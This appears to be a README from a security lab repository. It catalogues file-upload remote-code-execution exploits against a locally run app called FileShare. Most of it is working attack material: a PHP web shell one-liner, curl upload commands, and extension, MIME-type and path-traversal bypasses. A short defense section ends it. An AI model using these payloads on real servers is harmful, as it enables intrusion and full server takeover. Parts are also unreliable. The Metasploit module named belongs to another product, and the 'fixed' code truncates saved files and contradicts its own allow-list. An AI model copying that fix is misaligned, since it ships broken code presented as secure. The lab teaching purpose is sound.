# FileShare RCE Exploits

## Overview
File upload vulnerabilities in FileShare allow arbitrary code execution through malicious file uploads.

## Target Application
- **App**: FileShare
- **Port**: 5003
- **Vulnerability**: File Upload RCE
- **Severity**: CRITICAL

## Available Exploits

### 1. file_upload_rce.py
Uploads malicious files to gain code execution.

**Usage**:
```bash
python file_upload_rce.py http://localhost:5003
```

### 2. upload_bypass.py
Bypasses file type restrictions.

**Usage**:
```bash
python upload_bypass.py http://localhost:5003 --file shell.php
```

### 3. jetspeed_upload.rb
Metasploit module for upload attacks.

**Usage**:
```bash
msfconsole
use exploit/multi/http/jetspeed_upload_exec
set RHOSTS localhost
set RPORT 5003
exploit
```

## Attack Techniques

### Method 1: Direct PHP Upload
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload
curl -F "file=@shell.php" http://localhost:5003/upload

# Execute
curl "http://localhost:5003/uploads/shell.php?cmd=id"
```

### Method 2: Double Extension
```bash
# Bypass extension filter
mv shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" http://localhost:5003/upload
```

### Method 3: MIME Type Manipulation
```bash
curl -F "file=@shell.php;type=image/jpeg" http://localhost:5003/upload
```

### Method 4: Path Traversal in Filename
```bash
curl -F "file=@shell.php" -F "filename=../../../var/www/shell.php" http://localhost:5003/upload
```

## Testing Steps

1. **Start FileShare**:
```bash
cd ../../projects/fileshare
docker-compose up -d
```

2. **Run Exploit**:
```bash
python file_upload_rce.py http://localhost:5003
```

3. **Verify RCE**:
```bash
curl "http://localhost:5003/uploads/shell.php?cmd=whoami"
```

## Defense

**Vulnerable**:
```python
file = request.files['file']
file.save(f'uploads/{file.filename}')
```

**Fixed**:
```python
from werkzeug.utils import secure_filename
import magic

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

file = request.files['file']
if file and allowed_file(file.filename):
    # Validate MIME type
    mime = magic.from_buffer(file.read(1024), mime=True)
    if mime not in ['text/plain', 'image/jpeg']:
        return "Invalid file type"
    
    filename = secure_filename(file.filename)
    file.save(f'uploads/{filename}')
```

## Notes
**WARNING**: File upload RCE provides complete server control.

**Prevention**:
- Validate file content, not just extension
- Store uploads outside webroot
- Rename uploaded files
- Set non-executable permissions
- Use virus scanning

## Related Exploits
- See `../lfi/lfi_to_rce.py` for LFI-based RCE
- See `../../adminpanel/rce/` for direct RCE exploits

## References
- OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- File Upload Attacks: https://portswigger.net/web-security/file-upload
